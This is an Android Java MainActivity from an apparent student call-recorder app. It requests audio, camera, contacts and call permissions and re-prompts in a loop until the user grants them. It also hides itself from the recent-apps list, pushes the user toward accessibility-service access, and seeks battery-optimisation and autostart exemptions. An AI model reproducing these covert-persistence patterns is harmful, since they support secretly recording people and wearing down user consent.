package in.ac.vitbhopal.projects.callrecorder;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.app.ActivityManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;

import java.util.List;

@RequiresApi(api = Build.VERSION_CODES.P)
public class MainActivity extends AppCompatActivity {
    private static Intent projectionData = null;
    private static final String[] permissions = {
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.FOREGROUND_SERVICE,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_CONTACTS
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        hideFromRecents();
        requestPermissions();
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        if (hasFocus) {
            requestPermissions();
        }
    }


    public void requestPermissions() {
        if (!hasPermissions(permissions)) {
            ActivityCompat.requestPermissions(
                    this,
                    permissions,
                    RecorderConstants.REQUESTCODE_PERMISSIONS
            );
        } else {
            requestAccessibilityService();
        }
    }

    private void hideFromRecents() {
        ActivityManager activityManager = (ActivityManager)getSystemService(Context.ACTIVITY_SERVICE);
        if (activityManager == null) return;
        List<ActivityManager.AppTask> tasks = activityManager.getAppTasks();
        if (tasks != null && tasks.size() > 0) {
            tasks.get(0).setExcludeFromRecents(true);
        }
    }


    public void requestAccessibilityService() {
        if (!isAccessibilityEnabled()) {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivityForResult(intent, RecorderConstants.REQUESTCODE_ACCESSIBILITY);
        } else {
            requestBatteryUnoptimized();
        }
    }

    public boolean hasPermissions(String... permissions) {
        for (String perm: permissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        switch (requestCode) {
            case RecorderConstants.REQUESTCODE_ACCESSIBILITY:
                requestBatteryUnoptimized();
                break;
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode) {
            case RecorderConstants.REQUESTCODE_PERMISSIONS:
                // Recursively force user to provide required permissions
                if (grantResults.length < permissions.length) {
                    requestPermissions();
                } else {
                    requestAccessibilityService();
                }
                break;
        }
    }

    private boolean isAccessibilityEnabled() {
        String prefString = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        if (prefString == null) return false;
        return prefString.contains(getApplicationContext().getPackageName()+ "/"+getApplicationContext().getPackageName() +".services.RecorderService");
    }

    private boolean isIgnoringBatteryOptimizations() {
        PowerManager powerManager = (PowerManager) getApplicationContext().getSystemService(getApplicationContext().POWER_SERVICE);
        String name = getApplicationContext().getPackageName();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            return powerManager.isIgnoringBatteryOptimizations(name);
        }
        return true;
    }

    private void requestBatteryUnoptimized() {
        if (!isIgnoringBatteryOptimizations() && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
            startActivity(intent);
        } else {
            requestAutoStartup();
        }
    }
    private void requestAutoStartup() {

        try {
            Intent intent = new Intent();
            String manufacturer = android.os.Build.MANUFACTURER;
            if ("xiaomi".equalsIgnoreCase(manufacturer)) {
                intent.setComponent(new ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity"));
            } else if ("oppo".equalsIgnoreCase(manufacturer)) {
                intent.setComponent(new ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity"));
            } else if ("vivo".equalsIgnoreCase(manufacturer)) {
                intent.setComponent(new ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"));
            } else if ("Letv".equalsIgnoreCase(manufacturer)) {
                intent.setComponent(new ComponentName("com.letv.android.letvsafe", "com.letv.android.letvsafe.AutobootManageActivity"));
            } else if ("Honor".equalsIgnoreCase(manufacturer)) {
                intent.setComponent(new ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity"));
            }else {
                moveTaskToBack(true);
                return;
            }

            List<ResolveInfo> list = getPackageManager().queryIntentActivities(intent, PackageManager.MATCH_DEFAULT_ONLY);
            if  (list.size() > 0) {
                startActivity(intent);
            }
        } catch (Exception e) {
            String message = e.getMessage();
            if (message == null) {
                message = "Could not init AutoStartup!";
            }
            Log.e(RecorderConstants.DEBUG_TAG , message);
        }
    }
}